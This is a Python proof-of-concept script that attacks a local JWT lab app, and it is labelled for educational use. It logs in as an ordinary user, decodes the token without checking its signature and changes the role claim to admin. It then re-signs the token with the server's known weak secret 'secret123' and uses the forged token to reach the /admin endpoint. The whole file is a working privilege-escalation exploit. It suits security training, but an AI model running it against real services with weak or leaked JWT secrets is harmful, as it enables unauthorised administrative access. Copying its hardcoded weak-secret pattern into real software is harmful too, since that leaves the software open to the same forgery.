#!/usr/bin/env python3
"""
JWT Auth Bypass / Privilege Escalation PoC

This script:
1. Authenticates as a normal user against the vulnerable JWT lab.
2. Extracts the returned JWT.
3. Decodes the token without verifying the signature.
4. Modifies the payload to set role=admin.
5. Re-signs the token using the server's SECRET_KEY ("secret123").
6. Uses the forged admin token to access the /admin endpoint.

For lab / educational use only.
"""

import requests
import jwt  # PyJWT

BASE_URL = "http://127.0.0.1:5000"
SECRET_KEY = "secret123"

USERNAME = "zaib"      # or "jan" if that's what you used in app.py
PASSWORD = "password123"


def get_user_token():
    print("[*] Logging in as normal user...")
    resp = requests.post(
        f"{BASE_URL}/login",
        json={"username": USERNAME, "password": PASSWORD},
    )

    print(f"    [*] Status: {resp.status_code}")
    print(f"    [*] Body  : {resp.text}")

    resp.raise_for_status()
    data = resp.json()
    return data["token"]


def forge_admin_token(token):
    print("\n[*] Decoding original token (without verifying signature)...")
    header = jwt.get_unverified_header(token)
    payload = jwt.decode(token, options={"verify_signature": False})

    print(f"    [*] Header : {header}")
    print(f"    [*] Payload: {payload}")

    print("\n[*] Modifying payload: role -> admin")
    payload["role"] = "admin"

    print(f"    [*] New payload: {payload}")

    print("\n[*] Re-signing token with known SECRET_KEY...")
    forged = jwt.encode(payload, SECRET_KEY, algorithm=header.get("alg", "HS256"))

    # PyJWT may return bytes on some versions; normalize to str
    if isinstance(forged, bytes):
        forged = forged.decode()

    print(f"    [*] Forged token:\n{forged}\n")
    return forged


def use_admin_token(forged_token):
    print("[*] Sending forged token to /admin ...")
    resp = requests.get(
        f"{BASE_URL}/admin",
        headers={"Authorization": forged_token},
    )

    print(f"    [*] Status: {resp.status_code}")
    print(f"    [*] Response body:\n{resp.text}")


def main():
    user_token = get_user_token()
    forged = forge_admin_token(user_token)
    use_admin_token(forged)


if __name__ == "__main__":
    main()
